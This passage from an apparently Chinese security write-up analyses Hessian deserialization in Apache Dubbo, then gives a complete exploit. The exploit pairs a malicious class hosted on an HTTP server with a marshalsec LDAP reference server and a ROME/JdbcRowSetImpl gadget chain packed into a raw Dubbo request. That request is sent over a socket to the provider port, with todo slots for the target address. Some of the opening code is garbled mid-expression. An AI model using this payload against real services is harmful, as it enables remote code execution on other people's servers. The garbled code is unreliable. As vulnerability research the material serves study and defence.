            _classDefs = new ArrayList();
        _classDefs.add(def);
    }
从前面所说的数据包，以及C这个tag的含义，我们可以看到，数据包的反序列化，会先对方法传入参数对应的class，进行类定义的读取，接着
    case 0x60:
    case 0x61:
    case 0x62:
    case 0x63:
    case 0x64:
    case 0x65:
    case 0x66:
    case 0x67:
    case 0x68:
    case 0x69:
    case 0x6a:
    case 0x6b:
    case 0x6c:
    case 0x6d:
    case 0x6e:
    case 0x6f: {
        int ref = tag - 0x60;
        int size = _classDefs.size();
        if (ref  (1  T readObject(Class cls) throws IOException,
            ClassNotFoundException {
        return (T) mH2i.readObject(cls);
    }
->
    @Override
    public Object readObject(Class cl)
            throws IOException {
        return readObject(cl, null, null);
    }
->
    @Override
    public Object readObject(Class expectedClass, Class... expectedTypes) throws IOException {
        //...
        switch (tag) {
            //...
            case 'H': {
                Deserializer reader = findSerializerFactory().getDeserializer(expectedClass);
                boolean keyValuePair = expectedTypes != null && expectedTypes.length == 2;
                // fix deserialize of short type
                return reader.readMap(this
                        , keyValuePair ? expectedTypes[0] : null
                        , keyValuePair ? expectedTypes[1] : null);
            }
            //...    
        }
    }
->
    @Override
    public Object readMap(AbstractHessianInput in, Class expectKeyType, Class expectValueType) throws IOException {
        Map map;
        if (_type == null)
            map = new HashMap();
        else if (_type.equals(Map.class))
            map = new HashMap();
        else if (_type.equals(SortedMap.class))
            map = new TreeMap();
        else {
            try {
                map = (Map) _ctor.newInstance();
            } catch (Exception e) {
                throw new IOExceptionWrapper(e);
            }
        }
        in.addRef(map);
        doReadMap(in, map, expectKeyType, expectValueType);
        in.readEnd();
        return map;
    }
->
    protected void doReadMap(AbstractHessianInput in, Map map, Class keyType, Class valueType) throws IOException {
        Deserializer keyDeserializer = null, valueDeserializer = null;
        SerializerFactory factory = findSerializerFactory(in);
        if(keyType != null){
            keyDeserializer = factory.getDeserializer(keyType.getName());
        }
        if(valueType != null){
            valueDeserializer = factory.getDeserializer(valueType.getName());
        }
        while (!in.isEnd()) {
            map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(),
                    valueDeserializer != null? valueDeserializer.readObject(in) : in.readObject());
        }
    }
从上面贴出来的部分执行栈信息，可以清晰的看到，最终在反序列化中实例化了新的HashMap，然后把反序列化出来的实例put进去，因此，会触发key的hashCode方法。
创建gadget chain：
  * 具有rome依赖的gadget chain
依赖
      com.rometools
      rome
      1.7.0
创建恶意class，放到http服务器（80端口）
    public class ExecObject {
        static {
            try {
                Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
启动ldap服务
    java -jar marshalsec.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:80/#ExecObject 44321
构造payload
    JdbcRowSetImpl rs = new JdbcRowSetImpl();
    //todo 此处填写ldap url
    rs.setDataSourceName("ldap://127.0.0.1:43658/ExecObject");
    rs.setMatchColumn("foo");
    Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
    ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
    EqualsBean root = new EqualsBean(ToStringBean.class, item);
    HashMap s = new HashMap<>();
    Reflections.setFieldValue(s, "size", 2);
    Class nodeC;
    try {
      nodeC = Class.forName("java.util.HashMap$Node");
    }
    catch ( ClassNotFoundException e ) {
      nodeC = Class.forName("java.util.HashMap$Entry");
    }
    Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
    nodeCons.setAccessible(true);
    Object tbl = Array.newInstance(nodeC, 2);
    Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
    Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
    Reflections.setFieldValue(s, "table", tbl);
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    // header.
    byte[] header = new byte[16];
    // set magic number.
    Bytes.short2bytes((short) 0xdabb, header);
    // set request and serialization flag.
    header[2] = (byte) ((byte) 0x80 | 2);
    // set request id.
    Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
    ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
    Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
    out.writeUTF("2.0.2");
    //todo 此处填写注册中心获取到的service全限定名、版本号、方法名
    out.writeUTF("com.threedr3am.learn.server.boot.DemoService");
    out.writeUTF("1.0");
    out.writeUTF("hello");
    //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
    out.writeUTF("Ljava/util/Map;");
    out.writeObject(s);
    out.writeObject(new HashMap());
    out.flushBuffer();
    if (out instanceof Cleanable) {
      ((Cleanable) out).cleanup();
    }
    Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
    byteArrayOutputStream.write(header);
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
    byte[] bytes = byteArrayOutputStream.toByteArray();
    //todo 此处填写被攻击的dubbo服务提供者地址和端口
    Socket socket = new Socket("127.0.0.1", 20880);
    OutputStream outputStream = socket.getOutputStream();
    outputStream.write(bytes);
    outputStream.flush();
    outputStream.close();
我这里把gadget
chain的demo放在github上，感兴趣的可以clone下来试试：
具体代码位于com.threedr3am.bug.dubbo.JdbcRowSetImplPoc
  * 其它gadget chain  
除了rome外，还有其它的gadget chains，例如bcel加载器等等，这里就不写出来了。